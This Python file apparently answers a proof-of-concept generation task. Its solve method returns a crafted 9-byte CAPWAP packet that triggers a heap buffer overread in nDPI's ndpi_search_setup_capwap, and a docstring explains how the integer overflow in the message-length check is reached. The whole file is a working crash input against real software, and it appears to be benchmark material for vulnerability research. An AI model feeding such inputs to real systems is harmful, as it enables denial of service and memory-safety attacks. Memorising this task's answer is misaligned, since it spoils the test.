import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept input that triggers a heap buffer overread
        in the ndpi_search_setup_capwap function (CVE-2020-15467).

        The vulnerability is caused by an integer overflow when parsing CAPWAP
        message elements. The check `if ((msg_len + 4) > len)` can be bypassed
        if `msg_len` is large (e.g., 0xFFFF), causing `msg_len + 4` to wrap
        around when treated as a 16-bit unsigned integer. The subsequent pointer
        arithmetic `ptr += (msg_len + 4)` uses the non-wrapped value due to C's
        integer promotion rules, advancing the pointer far out of bounds. The next
        loop iteration then reads from this out-of-bounds pointer, causing a crash.

        To reach the vulnerable code, two conditions must be met:
        1. The packet must be identified as a CAPWAP control packet. This is
           determined by the `t_flag` (bit 0 of the second byte), which must be 1.
           If `t_flag` is 0, the function returns early.
        2. The message element parsing loop must be entered. This requires the
           remaining packet length `len` to be greater than 4. `len` is calculated
           as `packet_length - hlen`, where `hlen` is the header length.

        This PoC is crafted to be minimal while satisfying these conditions:
        - Total length: 9 bytes.
        - Header length (`hlen`): 4 bytes. This is the minimum possible, derived
          from the `HLEN` field (5 bits) set to 1. `HLEN=1` -> `payload[0] = 0x08`.
        - `t_flag`: Set to 1, so `payload[1] = 0x01`.
        - Message element section length (`len`): `9 - 4 = 5` bytes. This is the
          minimum to satisfy `len > 4`.
        - Message element: A 5-byte payload containing a fake message element with
          a type of 0 and a length (`msg_len`) of 0xFFFF to trigger the overflow.
        """

        # CAPWAP Header (4 bytes):
        # - payload[0]: HLEN=1 -> (1 << 3) = 0x08. Rest of bits are 0.
        # - payload[1]: t_flag=1 -> 0x01. Rest of bits are 0.
        # - payload[2:3]: Padding.
        header = b'\x08\x01\x00\x00'

        # Malicious Message Element Payload (5 bytes):
        # - len = 9 (total) - 4 (header) = 5.
        # - Message Type (2 bytes): 0x0000
        # - Message Length (2 bytes): 0xFFFF (the vulnerable value)
        # - Value/Padding (1 byte): 0x00 (to make len=5)
        message_body = b'\x00\x00\xff\xff\x00'
        
        poc = header + message_body
        return poc